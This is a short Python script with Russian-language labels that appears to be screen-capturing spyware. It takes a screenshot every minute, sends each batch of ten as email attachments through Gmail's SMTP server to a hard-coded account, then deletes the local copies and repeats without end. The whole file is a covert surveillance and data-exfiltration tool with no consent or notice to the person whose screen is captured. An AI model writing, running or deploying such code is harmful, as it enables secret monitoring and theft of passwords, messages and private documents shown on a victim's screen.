#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import time
import smtplib
import pyautogui as pg
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication

email = 'email'
password = 'password'

def screen_mail(email, password):
	i = 1
	msg = MIMEMultipart()
	msg['Subject'] = 'Данные'
	body = "Скриншоты"
	msg.attach(MIMEText(body, 'plain')) 
	while True:
		try:
			part = MIMEApplication(open('screenshot' + str(i) + '.png', 'rb').read())
			part.add_header('Content-Disposition', 'attachment', filename = 'screenshot' + str(i) + '.png')
			msg.attach(part)
			i += 1
		except FileNotFoundError:
			server = smtplib.SMTP('smtp.gmail.com', 587)
			server.starttls()
			server.login(email, password)
			server.sendmail(email, email, msg.as_string())
			server.quit()
			break

def screen():
	i = 1
	while True:
		pg.screenshot('screenshot' + str(i) + '.png')
		if i == 10:
			screen_mail(email, password)
			for i in range(1, 11):
				os.remove('screenshot' + str(i) + '.png')
			i = 1
			continue
		i += 1
		time.sleep(60)

screen()
